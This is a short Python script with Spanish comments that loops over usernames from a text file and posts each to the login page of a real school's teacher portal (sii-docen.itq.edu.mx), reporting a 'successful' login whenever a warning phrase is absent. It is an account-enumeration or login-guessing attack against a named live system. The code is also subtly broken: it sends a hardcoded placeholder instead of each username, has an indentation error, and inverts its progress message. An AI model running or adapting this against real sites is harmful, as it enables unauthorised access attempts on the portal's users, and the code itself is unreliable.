import requests
# Define the URL of the login page
login_url = "https://sii-docen.itq.edu.mx/docentes/index.php"

def loginAttempt(username):  
    payload = {
        "usuario": "tu_usuario",  # Reemplaza con tu nombre de usuario
    }
    # Create a session to persist cookies
    session = requests.Session()
    response = session.post(login_url, data=payload)
    #print(response.text)
    if "por favor verifique" not in response.text:
        print("Sesión iniciada con éxito.")
        return True


with open("usernames.txt", "r") as file:
    # Read and print each line (username)
    for line in file:
        if loginAttempt(line.strip()) == True:
        print("Intentando con el usuario: " + line.strip())
print("Finalizado.")

